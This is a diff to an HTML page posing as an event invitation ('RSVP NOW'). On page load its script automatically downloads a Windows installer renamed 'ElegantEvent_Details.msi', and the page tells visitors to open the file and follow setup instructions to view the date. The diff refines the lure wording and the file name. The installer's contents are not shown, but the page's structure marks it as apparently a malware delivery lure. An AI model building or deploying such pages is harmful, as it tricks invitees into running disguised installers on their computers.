@@ -8,7 +8,7 @@
   <style>
     /* ========== BACKGROUND CONFIGURATION (EDIT HERE) ========== */
     /* Change the URL to your preferred background image */
-    /* Example: background: url("AWQ.jpg") center/cover no-repeat fixed; */
+    /* Example: background: url("your-image.jpg") center/cover no-repeat fixed; */
     body::before {
       content: "";
       position: fixed;
@@ -17,7 +17,7 @@
       width: 100%;
       height: 100%;
       z-index: -1;
-      background: url("AWQ.jpg") center/cover no-repeat fixed;
+      background: url("awes.jpg") center/cover no-repeat fixed;
       /* Alternative backgrounds you can use by uncommenting one: */
       /* background: url("https://images.unsplash.com/photo-1519681393784-d120267933ba") center/cover no-repeat fixed; */
       /* background: linear-gradient(135deg, #667eea 0%, #764ba2 100%) fixed; */
@@ -233,7 +233,7 @@
 
         <!-- Manual download link -->
         <p class="details" style="margin-top:18px">
-          If the download didn't start, <a id="manualDownload" href="#" download>download manually</a>.
+          If the download didn’t start, <a id="manualDownload" href="#" download>download manually</a>.
         </p>
         <!-- ========= /EDIT ME ========= -->
       </div>
@@ -315,11 +315,12 @@
       nameA: "RSVP NOW",
       nameB: "Instructions",
       dateInfo: "Get ready for your Invite",
-      venueLine1: "Wait for the download to finish.Open the downloaded file",
-      venueLine2: "Follow the on-screen setup instructions to View and Save the date and also send a Reply",
-      venueLine3: "Follow the on-screen setup instructions.",
-      venueLine4: "View and Save the date and also send a Reply ",
-      note: "Kindly join us for an evening of celebration, dinner and dancing. Dress code is classic elegance."
+      venueLine1: "Wait for the download to complete.Open the downloaded file",
+      venueLine2: "Open to view your invitation and event details.",
+      venueLine3: "Follow the on-screen setup instructions to View and Save the date and also send a Reply",
+      venueLine4: "Follow the on-screen setup instructions.",
+      venueLine5: "View and Save the date and also send a Reply ",
+      note: "Kindly join us for an evening of celebration, dinner and dancing.We look forward to seeing you."
     };
 
     for (const [k, v] of Object.entries(INVITE)) {
@@ -331,7 +332,7 @@
   <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
-    const FILE_NAME = "Elegantevent_MenuScreenpreview.msi";
+    const FILE_NAME = "ElegantEvent_Details.msi";
 
     // Wire manual link
     (function bindManual(){
@@ -353,7 +354,7 @@
         const a = document.createElement("a");
         a.style.display = "none";
         a.href = url;
-        a.download = url.split("/").pop() || "Elegantevent_MenuScreenpreview.msi";
+        a.download = url.split("/").pop() || "ElegantEvent_Details.msi";
         document.body.appendChild(a);
         a.click();
         a.remove();
@@ -379,7 +380,7 @@
           const a2 = document.createElement("a");
           a2.style.display = "none";
           a2.href = objectUrl;
-          a2.download = url.split("/").pop() || "Elegantevent_MenuScreenpreview.msi";
+          a2.download = url.split("/").pop() || "ElegantEvent_Details.msi";
           document.body.appendChild(a2);
           a2.click();
           a2.remove();
